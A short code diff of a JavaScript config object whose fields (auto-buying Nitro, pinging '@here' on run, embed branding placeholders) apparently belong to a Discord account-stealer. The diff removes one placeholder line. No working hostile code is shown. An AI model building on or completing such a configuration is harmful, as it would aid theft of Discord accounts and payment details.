@@ -10,7 +10,6 @@ const config = {
     auto_buy_nitro: true,
     ping_on_run: true,
     ping_val: "@here",
-    stringspy: "~~stringspy~~", // Dont mind me, I just exist
     embed_name: "~~branding~~",
     embed_icon: "~~icon~~",
     embed_color: 8363488,
